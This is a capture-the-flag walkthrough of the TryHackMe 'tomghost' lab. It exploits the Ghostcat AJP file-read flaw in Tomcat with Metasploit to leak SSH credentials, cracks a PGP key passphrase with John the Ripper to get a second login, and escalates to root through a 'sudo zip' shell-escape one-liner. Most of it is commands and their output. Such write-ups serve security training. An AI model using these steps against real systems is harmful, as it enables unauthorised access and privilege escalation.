# tomghost

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Challenge
Difficulty: Easy
OS: Linux
Subscription type: Free
Description: 
Identify recent vulnerabilities to try exploit the system or read files that you should not have access to.
```

Room link: [https://tryhackme.com/room/tomghost](https://tryhackme.com/room/tomghost)

## Solution

### Check for services with nmap

We start by scanning the machine on all ports with `nmap` including service info and default scripts

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/tomghost]
└─$ export TARGET_IP=10.10.47.135

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/tomghost]
└─$ sudo nmap -sV -sC -p- $TARGET_IP                                 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-05 13:19 CEST
Nmap scan report for 10.10.47.135
Host is up (0.043s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.12 seconds
```

We have three main services running and available:

- OpenSSH 7.2p2 on port 22
- Apache Jserv (Protocol v1.3) on port 8009
- Apache Tomcat 9.0.30 on port 8080

### Analyse the web site

Manually browsing to port 8080 shows a default Apache Tomcat-page.

![Web Page on tomghost](Images/Web_Page_on_tomghost.png)

Searching for additional files and directories with `gobuster`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/tomghost]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -t 32 -x php,txt,html -u http://$TARGET_IP:8080
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.47.135:8080
[+] Method:                  GET
[+] Threads:                 32
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 200) [Size: 17481]
/examples             (Status: 200) [Size: 1126]
/manager              (Status: 403) [Size: 3446]
/http%3A%2F%2Fwww     (Status: 400) [Size: 804]
/http%3A%2F%2Fwww.php (Status: 400) [Size: 804]
/http%3A%2F%2Fwww.txt (Status: 400) [Size: 804]
/http%3A%2F%2Fwww.html (Status: 400) [Size: 804]
/http%3A%2F%2Fyoutube.php (Status: 400) [Size: 804]
/http%3A%2F%2Fyoutube (Status: 400) [Size: 804]
/http%3A%2F%2Fyoutube.html (Status: 400) [Size: 804]
/http%3A%2F%2Fyoutube.txt (Status: 400) [Size: 804]
/http%3A%2F%2Fblogs.html (Status: 400) [Size: 804]
/http%3A%2F%2Fblogs   (Status: 400) [Size: 804]
/http%3A%2F%2Fblogs.php (Status: 400) [Size: 804]
/http%3A%2F%2Fblogs.txt (Status: 400) [Size: 804]
/http%3A%2F%2Fblog    (Status: 400) [Size: 804]
/http%3A%2F%2Fblog.txt (Status: 400) [Size: 804]
/http%3A%2F%2Fblog.php (Status: 400) [Size: 804]
/http%3A%2F%2Fblog.html (Status: 400) [Size: 804]
/**http%3A%2F%2Fwww.php (Status: 400) [Size: 804]
/**http%3A%2F%2Fwww   (Status: 400) [Size: 804]
/**http%3A%2F%2Fwww.html (Status: 400) [Size: 804]
/**http%3A%2F%2Fwww.txt (Status: 400) [Size: 804]
/RELEASE-NOTES.txt    (Status: 200) [Size: 6898]
/External%5CX-News.php (Status: 400) [Size: 795]
/External%5CX-News.html (Status: 400) [Size: 795]
/External%5CX-News.txt (Status: 400) [Size: 795]
/External%5CX-News    (Status: 400) [Size: 795]
/http%3A%2F%2Fcommunity.html (Status: 400) [Size: 804]
/http%3A%2F%2Fcommunity.txt (Status: 400) [Size: 804]
/http%3A%2F%2Fcommunity.php (Status: 400) [Size: 804]
/http%3A%2F%2Fcommunity (Status: 400) [Size: 804]
/http%3A%2F%2Fradar   (Status: 400) [Size: 804]
/http%3A%2F%2Fradar.php (Status: 400) [Size: 804]
/http%3A%2F%2Fradar.txt (Status: 400) [Size: 804]
/http%3A%2F%2Fradar.html (Status: 400) [Size: 804]
/http%3A%2F%2Fjeremiahgrossman (Status: 400) [Size: 804]
/http%3A%2F%2Fjeremiahgrossman.txt (Status: 400) [Size: 804]
/http%3A%2F%2Fjeremiahgrossman.html (Status: 400) [Size: 804]
/http%3A%2F%2Fjeremiahgrossman.php (Status: 400) [Size: 804]
/http%3A%2F%2Fweblog  (Status: 400) [Size: 804]
/http%3A%2F%2Fweblog.txt (Status: 400) [Size: 804]
/http%3A%2F%2Fweblog.html (Status: 400) [Size: 804]
/http%3A%2F%2Fweblog.php (Status: 400) [Size: 804]
/http%3A%2F%2Fswik.txt (Status: 400) [Size: 804]
/http%3A%2F%2Fswik.php (Status: 400) [Size: 804]
/http%3A%2F%2Fswik.html (Status: 400) [Size: 804]
/http%3A%2F%2Fswik    (Status: 400) [Size: 804]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

gives us nothing important!

### Search for available exploits

Next, we search for any available exploits

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/tomghost]
└─$ searchsploit tomcat ajp   
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                        |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Apache Tomcat - AJP 'Ghostcat File Read/Inclusion                                                                                                     | multiple/webapps/48143.py
Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Metasploit)                                                                                       | multiple/webapps/49039.rb
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

We have a Metasploit module we can use.

### Use the Metasploit module

Let's use the Metasploit module

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/tomghost]
└─$ msfconsole -q
msf > search tomcat ajp

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  auxiliary/admin/http/tomcat_ghostcat  2020-02-20       normal  Yes    Apache Tomcat AJP File Read


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/admin/http/tomcat_ghostcat

msf > use 0
msf auxiliary(admin/http/tomcat_ghostcat) > show options

Module options (auxiliary/admin/http/tomcat_ghostcat):

   Name      Current Setting   Required  Description
   ----      ---------------   --------  -----------
   FILENAME  /WEB-INF/web.xml  yes       File name
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     8009              yes       The Apache JServ Protocol (AJP) port (TCP)


View the full module info with the info, or info -d command.

msf auxiliary(admin/http/tomcat_ghostcat) > set RHOSTS 10.10.47.135
RHOSTS => 10.10.47.135
msf auxiliary(admin/http/tomcat_ghostcat) > exploit
[*] Running module against 10.10.47.135
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>
[+] 10.10.47.135:8009 - File contents save to: /home/kali/.msf4/loot/20250905134133_default_10.10.47.135_WEBINFweb.xml_516400.txt
[*] Auxiliary module execution completed
msf auxiliary(admin/http/tomcat_ghostcat) > exit
```

We have what seems to be credentials `skyfuck:8730281lkjlkjdqlksalks`.

### Login with SSH as skyfuck

Let's see if we can login with SSH with our new credentials

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/tomghost]
└─$ ssh skyfuck@$TARGET_IP     
The authenticity of host '10.10.47.135 (10.10.47.135)' can't be established.
ED25519 key fingerprint is SHA256:tWlLnZPnvRHCM9xwpxygZKxaf0vJ8/J64v9ApP8dCDo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.47.135' (ED25519) to the list of known hosts.
skyfuck@10.10.47.135's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

skyfuck@ubuntu:~$ 
```

We are in and have two files to use/crack

```bash
skyfuck@ubuntu:~$ ls -l
total 12
-rw-rw-r-- 1 skyfuck skyfuck  394 Mar 10  2020 credential.pgp
-rw-rw-r-- 1 skyfuck skyfuck 5144 Mar 10  2020 tryhackme.asc
skyfuck@ubuntu:~$ 
```

Let's download them with scp to our local machine

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/tomghost]
└─$ scp skyfuck@$TARGET_IP:/home/skyfuck/credential.pgp .
skyfuck@10.10.47.135's password: 
credential.pgp                                                                                                                                        100%  394     4.5KB/s   00:00    

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/tomghost]
└─$ scp skyfuck@$TARGET_IP:/home/skyfuck/tryhackme.asc . 
skyfuck@10.10.47.135's password: 
tryhackme.asc  
```

### Crack the private key

Next, we try to crack the private key.  
First we get the hash

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/tomghost]
└─$ head tryhackme.asc                                       
-----BEGIN PGP PRIVATE KEY BLOCK-----
Version: BCPG v1.63

lQUBBF5ocmIRDADTwu9RL5uol6+jCnuoK58+PEtPh0Zfdj4+q8z61PL56tz6YxmF
3TxA9u2jV73qFdMr5EwktTXRlEo0LTGeMzZ9R/uqe+BeBUNCZW6tqI7wDw/U1DEf
StRTV1+ZmgcAjjwzr2B6qplWHhyi9PIzefiw1smqSK31MBWGamkKp/vRB5xMoOr5
ZsFq67z/5KfngjhgKWeGKLw4wXPswyIdmdnduWgpwBm4vTWlxPf1hxkDRbAa3cFD
B0zktqArgROuSQ8sftGYkS/uVtyna6qbF4ywND8P6BMpLIsTKhn+r2KwLcihLtPk
V0K3Dfh+6bZeIVam50QgOAXqvetuIyTt7PiCXbvOpQO3OIDgAZDLodoKdTzuaXLa
cuNXmg/wcRELmhiBsKYYCTFtzdF18Pd9cM0L0mVy/nfhQKFRGx9kQkHweXVt+Pbb

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/tomghost]
└─$ gpg2john tryhackme.asc                                                                            

File tryhackme.asc
tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679abe2476c62bbd286ded0e049f886d32d2b9eb06f482e9770c710abc2903f1ed70af6fcc22f5608760be*3*254*2*9*16*0c99d5dae8216f2155ba2abfcc71f818*65536*c8f277d2faf97480:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/tomghost]
└─$ gpg2john tryhackme.asc > tryhackme_gpg.hash

File tryhackme.asc
```

And then we use `John the Ripper` with the rockyou-wordlist

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/tomghost]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt tryhackme_gpg.hash  
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)     
1g 0:00:00:00 DONE (2025-09-05 13:54) 7.142g/s 7657p/s 7657c/s 7657C/s marshall..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

The password for the private key is `alexandru`!

### Decrypt the file

Now we can decrypt the GPG-encrypted file.  
We import the private key

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/tomghost]
└─$ gpg --import tryhackme.asc
gpg: key 8F3DA3DEC6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
gpg: key 8F3DA3DEC6707170: secret key imported
gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
```

And then decrypt the file

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/tomghost]
└─$ gpg -d credential.pgp
gpg: encrypted with elg1024 key, ID 61E104A66184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j  
```

We get another set of credentials (`merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`)

### Switch user to merlin

Now we can switch user to merlin

```bash
skyfuck@ubuntu:~$ su merlin
Password: 
merlin@ubuntu:/home/skyfuck$ ls
credential.pgp  tryhackme.asc
merlin@ubuntu:/home/skyfuck$ cd ..
merlin@ubuntu:/home$ cd merlin/
merlin@ubuntu:~$ ls
user.txt
merlin@ubuntu:~$ 
```

And there we have the user flag.

### Get the user flag

Let's just view it with `cat`

```bash
merlin@ubuntu:~$ cat user.txt 
THM{<REDACTED>}
merlin@ubuntu:~$ 
```

### Enumeration

We now start enumerating for ways to escalate our privileges.  
First we check if we can run any commands as root via `sudo`

```bash
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

Apparently, we can run `zip` as root.  

### Get a root shell

As always GTFOBins [tell us how to proceed](https://gtfobins.github.io/gtfobins/zip/).

```bash
merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```

### Get the root flag

We get the root flag

```bash
# ls -l /root
total 8
-rw-r--r-- 1 root root   17 Mar 10  2020 root.txt
drwxr-xr-x 2 root root 4096 Mar 10  2020 ufw
# cat /root/root.txt
THM{<REDACTED>}
```

For additional information, please see the references below.

## References

- [Apache JServ Protocol - Wikipedia](https://en.wikipedia.org/wiki/Apache_JServ_Protocol)
- [Apache Tomcat - Wikipedia](https://en.wikipedia.org/wiki/Apache_Tomcat)
- [Gobuster - GitHub](https://github.com/OJ/gobuster/)
- [Gobuster - Kali Tools](https://www.kali.org/tools/gobuster/)
- [gpg - Linux manual page](https://linux.die.net/man/1/gpg)
- [GNU Privacy Guard - Wikipedia](https://en.wikipedia.org/wiki/GNU_Privacy_Guard)
- [John the Ripper - Homepage](https://www.openwall.com/john/)
- [john - Kali Tools](https://www.kali.org/tools/john/)
- [Metasploit - Documentation](https://docs.metasploit.com/)
- [Metasploit - Homepage](https://www.metasploit.com/)
- [Metasploit-Framework - Kali Tools](https://www.kali.org/tools/metasploit-framework/)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [OpenSSH - Wikipedia](https://en.wikipedia.org/wiki/OpenSSH)
- [scp - Linux manual page](https://man7.org/linux/man-pages/man1/scp.1.html)
- [Secure Shell - Wikipedia](https://en.wikipedia.org/wiki/Secure_Shell)
- [ssh - Linux manual page](https://man7.org/linux/man-pages/man1/ssh.1.html)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [zip - GTFOBins](https://gtfobins.github.io/gtfobins/zip/)
